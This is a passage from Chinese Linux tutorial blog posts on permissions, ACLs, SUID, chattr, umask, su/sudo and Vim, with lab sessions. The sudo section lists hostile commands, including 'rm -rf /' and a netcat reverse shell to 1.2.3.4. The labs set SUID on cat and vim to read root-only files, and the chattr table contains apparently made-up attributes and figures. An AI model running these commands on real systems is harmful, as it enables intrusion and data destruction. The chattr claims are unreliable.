755 mydir/  # rwxr-xr-x\n\n​\tUser：可读、写、进入目录。 \n​\tGroup&#x2F;Other：可读、进入目录，但不能创建&#x2F;删除文件。\n实验5：-R选项1.在tmp中创建递归目录dir1，观察新建文件夹的默认权限是多少（755）123[root@wyf tmp]# mkdir dir1[root@wyf tmp]# ll -d dir1/drwxr-xr-x. 2 root root 6 8月   1 11:12 dir1/\n\n2.在dir1目录中创建3个文件111、222、333，观察文件默认权限是多少（644）12345678[root@wyf dir1]# touch 111 222 333[root@wyf dir1]# cd ..[root@wyf tmp]# ll dir1总用量 0-rw-r--r--. 1 root root 0 8月   1 11:13 111-rw-r--r--. 1 root root 0 8月   1 11:13 222-rw-r--r--. 1 root root 0 8月   1 11:13 333[root@wyf tmp]# \n\n3.修改dir1权限为777，观察文件是否变化12345678[root@wyf tmp]# chmod 777 dir1/[root@wyf tmp]# ll -d dir1/drwxrwxrwx. 2 root root 39 8月   1 11:13 dir1/[root@wyf tmp]# ll dir1/总用量 0-rw-r--r--. 1 root root 0 8月   1 11:13 111-rw-r--r--. 1 root root 0 8月   1 11:13 222-rw-r--r--. 1 root root 0 8月   1 11:13 333\n\n4.通过-R递归修改dir1中所有文件权限为70012345678[root@wyf tmp]# chmod -R 700 dir1/[root@wyf tmp]# ll -d dir1/drwx------. 2 root root 39 8月   1 11:13 dir1/[root@wyf tmp]# ll dir1/总用量 0-rwx------. 1 root root 0 8月   1 11:13 111-rwx------. 1 root root 0 8月   1 11:13 222-rwx------. 1 root root 0 8月   1 11:13 333\n\n6.更改属主&#x2F;组改变权限（ chown命令）语法 change owner12chown： 设置一个文件属于谁，属主 语法： chown  用户名.组名  文件\n\n实验1：改属主、属组1.更改file1权限为60012345[root@wyf tmp]# ll file1.txt-rw-r--r--. 1 root root 72 8月   1 11:03 file1.txt[root@wyf tmp]# chmod 600 file1.txt[root@wyf tmp]# ll file1.txt-rw-------. 1 root root 72 8月   1 11:03 file1.txt\n\n2. 切换其他用户尝试访问123[root@wyf tmp]# su - abc[abc@wyf ~]$ cat /tmp/file1.txt cat: /tmp/file1.txt: 权限不够\n\n3. 返回root用户，更改文件属主&#x2F;组12345[abc@wyf ~]$ exit注销[root@wyf tmp]# chown abc.hr file1.txt [root@wyf tmp]# ll file1.txt -rw-------. 1 abc hr 72 8月   1 11:03 file1.txt\n\n4. 切换abc用户再次尝试访问12345[root@wyf tmp]# su - abc [abc@wyf ~]$ cat /tmp/file1.txt  echo &quot;hello zhouwu&quot; read -p &quot;please your name?&quot; name echo &quot;$name good&quot;\n\n实验2：只改属主12345[root@wyf tmp]# ll file1.txt -rw-------. 1 abc hr 72 8月   1 11:03 file1.txt[root@wyf tmp]# chown user999 file1.txt [root@wyf tmp]# ll file1.txt -rw-------. 1 user999 hr 72 8月   1 11:03 file1.txt\n\n实验3：只改属组12345[root@wyf tmp]# ll file1.txt -rw-------. 1 user999 hr 72 8月   1 11:03 file1.txt[root@wyf tmp]# chown .dev file1.txt [root@wyf tmp]# ll file1.txt -rw-------. 1 user999 dev 72 8月   1 11:03 file1.txt\n\n7. 关键注意事项​\t1.目录的执行权限（x）： \n​\t\t无 x 权限时，即使有 r 权限，也无法 cd 进入目录或读取其中文件列表。 \n​\t2.权限优先级： \n​\t\t系统按 User → Group → Other 的顺序匹配权限，首次匹配成功则生效。 \n​\t3.安全风险： \n​\t\t避免给文件设置  777 （所有用户可读可写可执行），尤其是敏感文件（如  &#x2F;etc&#x2F;passwd ）。\n8. 修改所属组（chgrp）1234# 修改所属组[root@wyf tmp]# chgrp hr file1.txt[root@wyf tmp]# ll file1.txt -rw-------. 1 user999 hr 72 8月   1 11:03 file1.txt\n\n9.综合练习需求：​\t文件file10.txt \n​\t属主是user100，读写执行-7（可以看内容，可以改内容，可以执行） \n​\t属组是jishuzu（user200），读取    -4（只能看，不能改，不能执行） \n​\t其他人         没有权限-0（既不能看，又不能改和执行）\n测试：​\t1.使用user100，访问文件。写入文件，执行文件 \n​\t2.使用jishuzu成员，访问文件，不可写和执行 \n​\t3.使用其他用户user300，访问文件失败。写入失败，执行失败。\n操作：1.创建文件123[root@wyf tmp]# touch file10.txt[root@wyf tmp]# ll file10.txt-rw-r--r--. 1 root root 0 8月   1 20:24 file10.txt\n\n2.创建用户123456789101112131415161718[root@wyf tmp]# useradd user100[root@wyf tmp]# useradd user200[root@wyf tmp]# useradd user300[root@wyf tmp]# passwd user100更改用户 user100 的密码 。新的 密码：重新输入新的 密码：passwd：所有的身份验证令牌已经成功更新。[root@wyf tmp]# passwd user200更改用户 user200 的密码 。新的 密码：重新输入新的 密码：passwd：所有的身份验证令牌已经成功更新。[root@wyf tmp]# passwd user300更改用户 user300 的密码 。新的 密码：重新输入新的 密码：passwd：所有的身份验证令牌已经成功更新。\n\n3.创建组12[root@wyf tmp]# groupadd jishuzu[root@wyf tmp]# usermod -aG jishuzu user200\n\n4.授予文件属主&#x2F;组，以及其他人的权限12345678[root@wyf tmp]# chmod 740 file10.txt[root@wyf tmp]# ll file10.txt -rwxr-----. 1 root root 0 8月   1 20:24 file10.txt[root@wyf tmp]# chown user100.jishuzu file10.txt[root@wyf tmp]# ll file10.txt -rwxr-----. 1 user100 jishuzu 0 8月   1 20:24 file10.txt[root@wyf tmp]# id user200uid=1002(user200) gid=1002(user200) 组=1002(user200),1004(jishuzu)\n\n5.测试user100,是否拥有rwx权限12345678910[user100@wyf tmp]$ cat file10.txtecho 123456[user100@wyf tmp]$ vim file10.txt[user100@wyf tmp]$ cat file10.txtecho 123456echo 456789[user100@wyf tmp]$ ./file10.txt 123456456789[user100@wyf tmp]$ \n\n6.测试user20012345678910[user100@wyf tmp]$ su - user200密码：[user200@wyf ~]$ cd /tmp[user200@wyf tmp]$ cat file10.txtecho 123456echo 456789[user200@wyf tmp]$ vim file10.txt[user200@wyf tmp]$ ./file10.txt-bash: ./file10.txt: 权限不够[user200@wyf tmp]$ \n\n\n7.测试user30012345678[user200@wyf tmp]$ su - user300密码：[user300@wyf ~]$ cd /tmp[user300@wyf tmp]$ cat file10.txtcat: file10.txt: 权限不够[user300@wyf tmp]$ vim file10.txt[user300@wyf tmp]$ ./file10.txt-bash: ./file10.txt: 权限不够\n\n\n二、基本权限ACL1、ACL 与 UGO 的区别1. UGO 权限的局限性​\t仅支持三个对象：用户（User）、组（Group）、其他人（Other）。 \n​\t无法精细化控制：无法为同一文件设置多个独立用户的差异化权限。\n2. ACL 的优势​\t多对象支持：可为同一文件设置多个用户&#x2F;组的独立权限。 \n​\t精细化控制：支持 r（读）、w（写）、x（执行）的灵活组合。\n2、ACL 核心命令语法1. 设置权限： setfacl1setfacl -m &lt;用户/组&gt;:&lt;名称&gt;:&lt;权限&gt; &lt;文件/目录&gt;\n\n参数解析：\n​\t-m ：修改权限（-x 删除，-b 清空所有 ACL）。 \n​\t&lt;用户&#x2F;组&gt;：u（用户）、g（组）、o（其他人）。 \n​\t&lt;名称&gt;：用户名或组名（留空表示默认属主&#x2F;组）。 \n​\t&lt;权限&gt;：r&#x2F;w&#x2F;x（可组合，如 rw ）。\n123456# 为用户 alice 设置读写权限  setfacl -m u:alice:rw /home/test.txt  # 为组 hr 设置只读权限  setfacl -m g:hr:r /home/test.txt  # 禁止用户 jack 访问  setfacl -m u:jack:- /home/test.txt\n\n3、ACL 权限设置与验证1. 创建测试文件123[root@wyf ~]# touch /home/test.txt[root@wyf ~]# ll /home/test.txt -rw-r--r--. 1 root root 0 8月   1 20:59 /home/test.txt\n\n2. 设置 ACL 权限设置用户user01拥有读写权限，设置hr组只读权限\n12[root@wyf ~]# setfacl -m u:user01:rw /home/test.txt[root@wyf ~]# setfacl -m g:hr:r /home/test.txt \n\n3. 查看 ACL 权限： getfacl1234567891011[root@wyf ~]# getfacl /home/test.txt getfacl: Removing leading &#x27;/&#x27; from absolute path names# file: home/test.txt# owner: root# group: rootuser::rwuser:user01:rwgroup::r--group:hr:r--mask::rwother::r--\n\n字段解析： \n​\tuser::rw- ：属主权限。 \n​\tuser:user01:rw- ：用户 user01的 ACL 权限。 \n​\tmask::rw- ：实际生效权限（与用户权限取交集）\n4、权限删除与恢复1. 删除单条 ACL123456789101112# 删除组 hr 的 ACL 权限  [root@wyf tmp]# setfacl -x g:hr /home/test.txt [root@wyf tmp]# getfacl /home/test.txt getfacl: Removing leading &#x27;/&#x27; from absolute path names# file: home/test.txt# owner: root# group: rootuser::rwuser:user01:rwgroup::r--mask::rwother::r--\n\n2. 清空所有 ACL12345678910[root@wyf tmp]# setfacl -b /home/test.txt [root@wyf tmp]# getfacl /home/test.txt getfacl: Removing leading &#x27;/&#x27; from absolute path names# file: home/test.txt# owner: root# group: rootuser::rwgroup::r--other::r--[root@wyf tmp]# ll /home/test.txt -rw-r--r--. 1 root root 0 8月   1 20:59 /home/test.txt\n\n3. 恢复默认权限123# 重置为 UGO 权限（需提前备份）  [root@wyf tmp]# chmod 644 /home/test.txt[root@wyf tmp]# ll /home/test.txt -rw-r--r--. 1 root root 0 8月   1 20:59 /home/test.txt\n\n5、高级特性与注意事项1. 递归设置目录权限12# 递归设置目录及子文件  setfacl -R -m u:alice:rwx /data/  \n\n2. 注意事项​\t权限优先级：ACL &gt; UGO（若冲突，以 ACL 为准）。 \n​\t备份与恢复：\n1234# 备份  getfacl -R /path &gt; acl_backup.txt  # 恢复  setfacl --restore=acl_backup.txt \n\n总结​\tACL 核心价值：解决 UGO 无法多用户精细化授权的问题，适用于团队协作场景。 \n​\t最佳实践：优先使用 UGO 满足基础需求，复杂场景再通过 ACL 补充。 \n​\t命令速查： \n​\t\t设置权限： setfacl -m \n​\t\t查看权限： getfacl \n​\t\t删除权限： setfacl -x 或 -b\n三、特殊权限1、特殊权限位1.SUID（safe uid）作用：suid针对文件&#x2F;程序时，具备临时获得属主的权限。 \n通过实验理解特殊权限位\n实验1：通过SUID临时提权实验目的：让普通用户通过SUID临时获得root权限，查看受保护文件  \n前置条件：\n​\t使用root账号创建测试文件 &#x2F;root&#x2F;file1.txt \n​\t创建普通用户  alice \n​\t编辑 file1.txt \n1234567[root@wyf ~]# touch /root/file1.txt[root@wyf ~]# useradd alice[root@wyf ~]# vim /root/file1.txt[root@wyf ~]# cat /root/file1.txt echo 1111111111[root@wyf ~]# ll /root/file1.txt -rw-r--r--. 1 root root 0 8月   1 21:18 /root/file1.txt\n\n​\t切换用户 alice ,尝试访问&#x2F;root&#x2F;file1.txt\n123[root@wyf ~]# su - alice[alice@wyf ~]$ cat /root/file1.txtcat: /root/file1.txt: 权限不够\n\n​\t改变文件属主，再次尝试访问，依旧不行\n1234[root@wyf ~]# chown alice /root/file1.txt[root@wyf ~]# su - alice[alice@wyf ~]$ cat /root/file1.txtcat: /root/file1.txt: 权限不够\n\n实验步骤： \n步骤1：查看默认权限\n12[root@wyf tmp]# ll /usr/bin/cat-rwxr-xr-x. 1 root root 51856 5月  12 2019 /usr/bin/cat\n\n步骤2：为 cat 命令添加SUID权限\n123456[root@wyf tmp]# ll /usr/bin/cat-rwxr-xr-x. 1 root root 51856 5月  12 2019 /usr/bin/cat[root@wyf tmp]# chmod u+s /usr/bin/cat[root@wyf tmp]# ll /usr/bin/cat-rwsr-xr-x. 1 root root 51856 5月  12 2019 /usr/bin/cat# 权限位出现&#x27;s&#x27;表示SUID生效\n\n步骤3：普通用户尝试访问受保护文件\n123[root@wyf tmp]# su - user01[user01@wyf ~]$ cat /root/file1.txtdddd\n\n步骤4：移除SUID权限（实验后必做！）\n12345[user01@wyf ~]$ exit注销[root@wyf tmp]# chmod u-s /usr/bin/cat[root@wyf tmp]# ll /usr/bin/cat-rwxr-xr-x. 1 root root 51856 5月  12 2019 /usr/bin/ca\n\n思考：\n​\t为什么设置SUID后普通用户能读取root文件？  \n​\t答案：SUID使程序运行时继承属主（root）权限，而非用户自身权限。 \n​\t观察命令passwd的权限，为什么不一样 \n​\t答案：因为所有用户都有要修改自己密码的权力 \n​\t观察文件 &#x2F;etc&#x2F;shadow的权限，为什么不一样 \n​\t答案：因为密码不允许任何人随意修改\n2、文件属性chattr作用：常用于锁定某个文件，拒绝修改。\n\n\n\n属性\n作用\n典型场景\n风险提示\n\n\n\n+i\n不可修改&#x2F;删除(Immutable)\n保护系统关键文件（如：/etc/passwd, /sbin/init）\n误启用导致系统更新失败\n\n\n+a\n仅追加(Append-Only)\n日志文件防篡改（如：/var/log/secure）\n需配合syslog权限控制\n\n\n+A\n禁用atime更新\n减少磁盘I&#x2F;O（SSD优化场景）\n影响文件访问跟踪\n\n\n+e\nExtents格式(ext4专属)\n优化大文件存储效率\n不可逆操作\n\n\n+C\n禁用Copy-on-Write(CoW)\n容器镜像层优化（OverlayFS环境）\n影响数据一致性\n\n\n+s\n安全删除(Secure Erase)\nGDPR合规数据销毁\n磁盘性能下降30%+\n\n\n+m\n压缩加密(2025新增)\nZstd透明压缩\n需内核6.3+支持\n\n\n实验2：通过chattr锁定文件 \n​\t实验目的：使用 chattr 防止文件被修改&#x2F;删除  \n实验步骤： \n​\t步骤1：创建测试文件并查看默认属性\n123[root@wyf tmp]# touch file100[root@wyf tmp]# lsattr file100-------------------- file100\n\n​\t步骤2：添加不可删除属性i\n123[root@wyf tmp]# chattr +i file100[root@wyf tmp]# lsattr file100----i--------------- file100\n\n​\t步骤3：尝试删除文件（失败）\n12[root@wyf tmp]# rm -rf file100rm: 无法删除&#x27;file100&#x27;: 不允许的操作\n\n​\t步骤4：恢复文件属性\n1234[root@wyf tmp]# chattr -i file100[root@wyf tmp]# lsattr file100-------------------- file100# 验证&#x27;i&#x27;属性移除\n\n​\t扩展属性： \n​\t\ta 属性：允许追加内容但禁止修改（适用于日志文件）\n1[root@localhost ~]# chattr +a file200  # 追加内容可用`echo &quot;text&quot; &gt;&gt; file200`\n\n3、进程掩码umask实验3：修改umask控制默认权限 \n实验目的：理解umask如何影响新建文件&#x2F;目录的默认权限  \n实验步骤： \n​\t步骤1：查看当前umask值\n12[root@localhost ~]# umask0022  # 默认掩码为0022\n\n​\t步骤2：创建文件&#x2F;目录观察默认权限\n12345[root@wyf ~]# touch file800[root@wyf ~]# mkdir dir800[root@wyf ~]# ll file800 dir800 -ddrwxr-xr-x. 2 root root 6 8月   1 21:36 dir800          # 文件权限644（666-022）-rw-r--r--. 1 root root 0 8月   1 21:36 file800         # 目录权限755（777-022）\n\n​\t步骤3：临时修改umask为000（开放全部权限）\n123456[root@localhost ~]# umask 000[root@localhost ~]# touch file900[root@localhost ~]# mkdir dir900[root@localhost ~]# ll file900 dir900 -d-rw-rw-rw-. 1 root root 0 8月   1 21:38 file900          # 文件权限666drwxrwxrwx. 2 root root 6 8月   1 21:38 dir900        # 目录权限777\n\n​\t步骤4：恢复umask为默认值\n1[root@localhost ~]# umask 0022\n\n计算公式： \n​\t文件默认权限 &#x3D;  666 - umask \n​\t目录默认权限 &#x3D;  777 - umask\n4、安全注意事项​\t1.SUID风险：滥用SUID可能导致权限提升漏洞，生产环境慎用！ \n​\t2.chattr优先级：i&#x2F;a属性对root同样有效，需通过移除属性恢复操作。\n​\t3.umask持久化：临时修改仅对当前会话有效，永久修改需编辑&#x2F;etc&#x2F;profile 或用户shell配置文件。\n四、课后练习​\t1.为 &#x2F;usr&#x2F;bin&#x2F;vim 设置SUID，观察普通用户能否编辑\n12chmod u+s /usr/bin/vimchmod u-s /usr/bin/vim\n\n​\t2.使用 &#x2F;etc&#x2F;shadow 。 chattr +a保护日志文件，测试追加与覆盖写入的区别。 \n12touch /var/log/test.logchattr +a /var/log/test.log  # 启用只追加模式\n\n​\t3.计算umask为 007 时，新建文件和目录的默认权限。\n\n\n\n类型\n基础权限\numask 007\n结果权限\n解释\n\n\n\n文件\n666\n007\n660\nrw-rw----（属主和属组可读写）\n\n\n目录\n777\n007\n770\nrwxrwx---（属主和属组可读写执行）\n\n\n","slug":"用户权限","date":"2025-08-01T02:10:46.000Z","categories_index":"","tags_index":"Linux","author_index":"wyf"},{"id":"8253069df3e619a90109a077baa63a85","title":"提权","content":"提权永久提权：Switching users with su1、基础语法su （Switch User）是 Linux&#x2F;Unix 系统中用于切换用户身份的核心命令，常用于临时获取目标用户的权 限（尤其是  root 用户）。\n1su [选项] [用户名]   \n\n常用选项：\n\n或 -l：模拟完整登录（加载目标用户的环境变量）。\n-c “命令”：以目标用户身份执行单条命令后退出。\n-s ：指定 Shell（如 -s &#x2F;bin&#x2F;bash ）。\n\n2、示例123su - root        # 完整登录，加载 root 环境变量（推荐）su root          # 仅切换用户身份，环境变量不变su -             # 等效于 su - root\n\n12su - alice       # 切换到 alice 用户（需 alice 的密码）su alice         # 仅切换身份，不加载环境变量\n\n1su - user01 -c &quot;whoami&quot;   #执行单条命令退出\n\n\n3、安全注意事项​\t密码暴露风险： \n​\t\troot 的 home 目录 su 需要输入目标用户的密码，若多人共用 root 密码，难以审计操作来源。  \n​\t\t推荐替代方案：使用  sudo 实现权限最小化和操作审计。 \n​\t禁用 root 登录：  在安全要求高的场景，可通过以下方式禁用 root 的  su 切换：\n123# 编辑 /etc/pam.d/suauth required pam_wheel.so use_uid# 仅允许 wheel 组成员使用 su\n\n4、实际应用场景12#系统维护su - root -c &quot;apt upgrade &amp;&amp; apt autoremove&quot;  # 以 root 身份更新系统\n\n12#多用户协作su - alice   # 切换到开发人员 alice 的账户调试环境\n\n12345#脚本中临时提权#!/bin/bash# 以 root 身份创建目录su - root -c &quot;mkdir /opt/custom_app&quot;chown user:user /opt/custom_app\n\n5、总结\n临时提权：Running commands as root with sudo1、基础语法sudo （Super User Do）是 Linux&#x2F;Unix 系统中用于临时以特权身份（如  root ）执行命令的核心工 具，相比 su 更安全且支持细粒度权限控制。以下是其核心概念、配置及实际应用指南。\n无需共享密码：验证当前用户密码，而非目标用户（如  root ）密码。\n最小权限原则：可限制用户仅能执行特定命令。 \n操作审计：所有  sudo 操作记录在  &#x2F;var&#x2F;log&#x2F;auth.log 或  &#x2F;var&#x2F;log&#x2F;secure 。 \n超时机制：默认 15 分钟内无需重复输入密码（可配置）。\n1sudo [选项] 命令\n\n常用选项：\n​\t-u 用户：以指定用户身份执行（默认 root ）\t\n​\t-i ：模拟完整登录（加载目标用户环境变量）。\n​\t-s ：启动目标用户的 Shell。\n​\t-l ：列出当前用户允许执行的命令。\n2、工作流程​\t1.权限检查： 系统读取  &#x2F;etc&#x2F;sudoers 文件，验证用户是否有权执行该命令。 \n​\t2.密码验证： 输入当前用户密码（若未配置  NOPASSWD ）。 \n​\t3.命令执行： 以目标用户身份执行命令，完成后权限自动回收。\n3、配置文件&#x2F;etc&#x2F;sudoers使用 visudo 命令编辑（避免语法错误）：\n1visudo  # 安全编辑方式\n\n1. 配置语法1用户/组   主机=(可切换身份)   可执行的命令 [参数]\n\n字段说明： \n​\t用户&#x2F;组：% 开头表示组（如  %admin ）。 \n​\t主机：ALL 表示所有主机。 \n​\t可切换身份：ALL 表示任意用户，可指定为如  (root) 。\n​\t命令：需使用绝对路径（ &#x2F;usr&#x2F;bin&#x2F;apt ）。\n2.示例规则123456# 允许 wheel 组成员以 root 身份执行所有命令%wheel ALL=(ALL)  ALL# 允许用户 alice 无需密码重启 Apachealice ALL=(root)  NOPASSWD: /usr/bin/systemctl restart httpd# 允许用户 bob 在特定主机上管理用户bob host01=(root) /usr/sbin/useradd, /usr/sbin/userdel\n\n3.实验目的：使一个新用户user777具有删除用户的权限\n方法一：将新用户加入wheel组123456789101112131415161718192021222324252627282930313233添加新用户user777,尝试使用sudo提权[root@wyf ~]# useradd user777[root@wyf ~]# passwd user777切换用户user777,使用userdel命令删除test用户[user777@wyf ~]$ userdel testuserdel: Permission denied.userdel：无法锁定 /etc/passwd，请稍后再试。使用sudo 提权尝试删除test用户[user777@wyf ~]$ sudo userdel test我们信任您已经从系统管理员那里了解了日常注意事项。总结起来无外乎这三点：\t\t#1) 尊重别人的隐私。\t\t#2) 输入前要先考虑(后果和风险)。\t\t#3) 权力越大，责任越大。[sudo] user777 的密码：user777 不在 sudoers 文件中。此事将被报告。                   #没有权限使用sudo,只有在/etc/soduers中的用户才可以新建用户user888，并添加到wheel组[root@wyf ~]# useradd user888 -aG wheel[root@wyf ~]# id user888uid=1506(user888) gid=1507(user888) 组=1507(user888),10(wheel)[root@wyf ~]# passwd user888切换用户user888，别用su [user888@wyf ~]$ sudo userdel -r test我们信任您已经从系统管理员那里了解了日常注意事项。总结起来无外乎这三点：\t\t#1) 尊重别人的隐私。\t\t#2) 输入前要先考虑(后果和风险)。\t\t#3) 权力越大，责任越大。[sudo] user888 的密码：[user888@wyf ~]$ grep test /etc/passwd                    #未找到test用户，已被删除\n\n方法二：编辑&#x2F;etc&#x2F;sudoers  添加特权12345678910111213141516171819新建用户user999,重复方法一中user777的操作，发现无法删除test用户编辑 /etc/sudoers 文件，将用户user999添加 userdel特权 （编辑前，先将文件进行备份！！！）[root@wyf ~]# cp /etc/sudoers /tmp/sudoers[root@wyf ~]# visudouser999 ALL=(root) /usr/sbin/userdel,/usr/sbin/useradd 切换用户999，删除用户test[user999@xnha ~]$ userdel -r testuserdel: Permission denied.userdel：无法锁定 /etc/passwd，请稍后再试。[user999@wyf ~]$ sudo userdel -r test我们信任您已经从系统管理员那里了解了日常注意事项。总结起来无外乎这三点：\t\t#1) 尊重别人的隐私。\t\t#2) 输入前要先考虑(后果和风险)。\t\t#3) 权力越大，责任越大。[sudo] user999 的密码：userdel：/var/spool/mail/test 并不属于 test，所以不会删除userdel：/home/test 并不属于 test，所以不会删除#删除成功\n\n4、 实际应用场景1.普通用户执行特权命令1234# 更新软件包列表sudo apt update# 查看系统日志（需 root 权限）sudo tail -f /var/log/syslog\n\n2. 以其他用户身份执行命令12# 以用户 mysql 身份启动进程sudo -u mysql /usr/bin/mysqld_safe\n\n3.进入特权 Shell 环境12sudo -i   # 切换到 root 的完整环境（加载变量）sudo -s   # 启动 root 的 Shell（保持当前目录）\n\n4.查看用户权限1sudo -l  # 列出当前用户可执行的命令\n\n5、安全最佳实践1.最小权限原则：避免赋予 ALL 权限，按需授权特定命令。 \n示例：仅允许用户管理服务： \n12user1  ALL=(root) /usr/bin/systemctl restart nginx, /usr/bin/systemctl  status nginx \n\n2.禁用密码（谨慎使用）：12#允许用户无需密码执行命令 user2  ALL=(root)  NOPASSWD: /usr/bin/apt update\n\n3.日志监控：检查  &#x2F;var&#x2F;log&#x2F;auth.log 或   &#x2F;var&#x2F;log&#x2F;secure，追踪可疑操作。\n4.超时配置： 修改默认超时时间（单位：分钟）： \n1Defaults timestamp_timeout=5  # 5 分钟后需重新输入密码\n\n5.禁用 root 登录：结合sudo 使用，增强安全性：  \n12# 禁用 root SSH 登录（/etc/ssh/sshd_config） PermitRootLogin no\n\n6、高级用法限制命令参数12# 允许 user5 仅能添加用户（禁止删除），防止命令注入攻击user5  ALL=(root)  /usr/sbin/useradd [A-Za-z]*\n\n12345678rm -rf /             #删库跑路wget / curl          #下载并执行恶意脚本nc 1.2.3.4 4444      #反向shellfind / -exec rm -rf  #结合 -exec执行恶意操作   echo                 #覆盖系统环境变量tar                  #压缩覆盖系统文件chmodcat\n\n7、实验练习使一个新用户user777具有删除test用户的权限方法一：将新用户加入wheel组\n12useradd user777      #创建用户 usermod -aG wheel user777   #将user777放入wheel组中\n\n方法二：编辑&#x2F;etc&#x2F;sudoers  添加特权\n12visudouser777 ALL=(ALL:ALL) ALL\n\n","slug":"提权","date":"2025-07-31T12:58:59.000Z","categories_index":"","tags_index":"Linux","author_index":"wyf"},{"id":"a2f5984a703b9b38689c64c1a82d51c5","title":"VIM-编辑器与用户管理","content":"VIM-编辑器与用户管理VIM编辑器1、Vim简介与模式Vim是一个高效文本编辑器，核心在于模式切换： \n普通模式（Normal Mode）：移动光标、执行命令（启动时默认模式）。 \n插入模式（Insert Mode）：输入&#x2F;编辑文本。 \n命令行模式（Command-line Mode）：保存、退出、搜索等操作。\n2、启动与退出启动Vim：终端输入 vim 文件名（文件不存在则新建）。 \n退出Vim： 普通模式下按 : 进入命令行模式。 \n​\t\t:q 退出（未修改时）。 \n​\t\t:q! 强制退出（不保存修改）。 \n​\t\t:wq 保存并退出。\n3、模式切换普通模式 → 插入模式： \n​\t\ti：光标前插入。 \n​\t\ta：光标后插入。 \n​\t\to：下一行插入。 \n插入模式 → 普通模式： \n​\t\t按 Esc 或 Ctrl+[ 。\n4、 基础移动（普通模式）方向键：h（左）、j（下）、k（上）、l（右）。 \n单词移动： \n​\t\tw：跳到下一个单词开头。 \n​\t\tb：跳到上一个单词开头。 \n行内移动： \n​\t\t0：行首，^：第一个非空字符。 \n​\t\t$：行尾。 \n全文移动： \n​\t\tgg：文件开头。 \n​\t\tG：文件末尾。 \n​\t\t50G：跳转到第50行。\n5、编辑文本删除： \n​\t\tx：删除光标处字符。 \n​\t\tdw：删除一个单词。 \n​\t\tdd：删除整行。 \n撤销与重做： \n​\t\tu：撤销操作。 \n​\t\tCtrl + r：重做撤销的操作。 \n复制与粘贴： \n​\t\tyy：复制当前行。 \n​\t\tp：粘贴到光标后。\n​\t\tP：粘贴到光标前。\n6、查找与替换查找： \n​\t\t普通模式下按 &#x2F;，输入关键词后回车（如 &#x2F;hello）。 \n​\t\tn 跳转到下一个匹配，N 上一个。 \n替换： \n​\t\t替换当前行第一个匹配：:s&#x2F;old&#x2F;new \n​\t\t替换当前行所有匹配：:s&#x2F;old&#x2F;new&#x2F;g \n​\t\t全文替换：:%s&#x2F;old&#x2F;new&#x2F;g（加 c 确认每次替换，如 :%s&#x2F;old&#x2F;new&#x2F;gc）。\n7、可视模式（Visual Mode）v：进入字符选择模式（按字符选择）。 \nV：进入行选择模式（按行选择）。 \nCtrl + v：进入块选择模式（垂直选择）。 \n操作：选中后按 y 复制，d 删除，p 粘贴。\n8、 配置Vim（.vimrc）创建配置文件：\n1vim ~/.vimrc\n\n常用配置示例：\n1234set number        # 显示行号syntax on         # 语法高亮set tabstop=4     # Tab缩进4空格set expandtab     # 用空格代替Tab\n\n9、VIM基础操作练习初始文件准备1vim file.txt  # 创建并打开文件\n\n文件初始内容（手动输入）12345applebananaorangegrapepear\n\n分步练习任务（1）打开文件并进入插入模式，在末尾添加一行 pineapple1234vim file.txtG               # 跳转到文件末尾i               # 进入插入模式（输入pineapple后按ESC）\n\n（2）复制第2行（banana）并粘贴到第4行下方12342G               # 跳转到第2行yy               # 复制当前行4G               # 跳转到第4行p                # 粘贴\n\n（3）删除第3行（orange）123G                # 跳转到第3行dd                # 删除当前行\n\n（4）显示行号并跳转到第5行（原pear行）12:set nu           # 显示行号5G                # 跳转到第5行\n\n（5）将光标移动到行首，插入 watermelon1230      # 跳转到行首i      # 进入插入模式（输入watermelon后按ESC）\n\n（6）查找所有 apple 并替换为 mango （仅替换前2行）1:1,2s/apple/mango/g  # 直接指定行号范围替换\n\n（7）撤销最后一次替换操作1u      # 撤销操作\n\n（8）强制退出不保存（模拟误操作）1:q!    # 强制退出\n\n（9）重新打开文件并另存为 backup.txt12vim file.txt  # 重新打开:w backup.txt # 另存为备份\n\n（10）保存并退出1:wq    # 保存退出\n\n文件类型1、核心命令： ls -l1ls -l [文件名/目录名]\n\n输出示例：\n\n2、详细拆解：\n总用量 12表示当前目录所有文件占用的磁盘块总数​（单位为1K块）。12表示这些文件共占用约12KB磁盘空间。\n文件权限信息-rw-r--r--. 分为四个部分：\n-：文件类型（-&#x3D;普通文件，d&#x3D;目录）\nrw-：所有者权限（可读写，不可执行）\nr--：所属组权限（只读）\nr--：其他用户权限（只读）\n.：SELinux安全上下文标记\n\n\n链接数和归属1 root root 表示：\n1：硬链接计数（此文件只有一个文件名指向它）\nroot：文件所有者\nroot：文件所属用户组\n\n\n文件大小\n31：backup.txt 和 file.txt 都是 31字节\n772：practice.txt 是 772字节\n\n\n修改时间7月 30 20:21 表示最后修改时间：\nbackup.txt 和 file.txt：7月30日晚上8点21分\npractice.txt：7月30日上午10点17分\n\n\n文件名\nbackup.txt\nfile.txt\npractice.txt\n\n\n\n3、文件类型符号说明（第一列第一个字符）\n4、操作演示1. 查看普通文件类型1ls -l /etc/passwd     # 输出示例：-rw-r--r--. 1 root root 2504 7月  28 19:38 /etc/passwd\n\n\n2. 查看目录文件类型1ls -ld /var/log       # 注意加-d参数查看目录本身 # 输出示例：drwxr-xr-x. 16 root root 4096 7月  31 11:15 /var/log\n\n\n3. 查看设备文件类型1ls -l /dev/sda        # 输出示例：brw-rw---- 1 root disk 8, 0 Aug 1 08:00 sda\n\n5、综合练习练习1：类型判断123ls -l /bin/ls ls -l /home ls -l /dev/tty\n\n1.指出每个文件的类型符号\n2.说明对应的文件类型 \n3.验证文件实际类型是否符号显示\n\n- 表示的文件类型是：常规文件 (Regular file)，这种类型包含：普通文本文件，可执行二进制文件（如此处的 /bin/ls），图片、视频等媒体文件，压缩包、文档等数据文件。\n\n输出显示 ELF 格式，表明是 Linux 平台的二进制可执行文件。\n\nd 表示的文件类型是：目录 (Directory)​，这是Linux中存储其他文件&#x2F;子目录的容器。常见于用户主目录、系统配置目录等（如此处的 wyf 用户目录）。\n\n明确显示为目录类型。\n\nc 表示的文件类型是：​字符设备文件 (Character device file)​​，提供无缓冲的、面向字符的I&#x2F;O操作（逐字节处理），通常用于流式设备，如终端、串口等，与块设备（如硬盘）的主要区别是数据访问方式。\n\nfile 命令输出确认其为字符特殊文件（character 